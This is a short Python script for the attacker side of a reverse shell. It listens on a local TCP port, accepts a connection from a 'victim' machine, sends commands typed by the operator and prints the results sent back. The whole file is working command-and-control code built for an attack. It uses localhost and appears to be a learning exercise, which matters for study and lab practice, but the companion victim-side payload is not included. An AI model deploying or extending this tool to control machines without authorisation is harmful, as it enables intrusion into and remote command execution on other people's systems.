import socket

IDENTIFIER = "<END_OF_COMMAND_RESULT>"

if __name__ == "__main__":
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP = "127.0.0.1"  # Change to localhost
    Port = 8008
    hacker_socket.bind((IP, Port))
    hacker_socket.listen(5)
    print("Listening for incoming connection requests...")
    
    client_socket, client_address = hacker_socket.accept()
    print("Connection established with ", client_address)

    try:
        while True:
            command = input("Enter the command: ")
            client_socket.send(command.encode())  # Send command to victim
            
            if command == "stop":
                client_socket.close()
                break
            elif command == "":
                continue
            elif command.startswith("cd"):
                continue
            else:
                full_command_result = b""
                while True:
                    chunk = client_socket.recv(1048)
                    if chunk.endswith(IDENTIFIER.encode()):
                        chunk = chunk[:-len(IDENTIFIER)]
                        full_command_result += chunk
                        break
                    full_command_result += chunk
                print(full_command_result.decode())  # Display command output
    except Exception as e:
        print("Exception occurred:", e)
        client_socket.close()
